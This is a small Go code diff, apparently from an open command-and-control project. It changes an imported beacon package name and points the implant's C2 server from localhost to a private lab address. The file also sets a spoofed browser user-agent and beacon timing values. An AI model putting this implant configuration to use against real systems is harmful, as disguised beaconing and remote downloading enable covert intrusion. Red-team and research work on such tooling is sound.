@@ -4,12 +4,12 @@ import (
 	"math/rand"
 	"time"
 
-	"github.com/averagesecurityguy/c2/beacon"
+	"github.com/averagesecurityguy/c2/beaconer"
 	"github.com/averagesecurityguy/c2/downloader"
 )
 
 // Define our costants
-const url = "http://127.0.0.1:8000"
+const url = "http://192.168.56.101"
 const agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
 const offset = 12 // In seconds
 const base = 0    // In hours
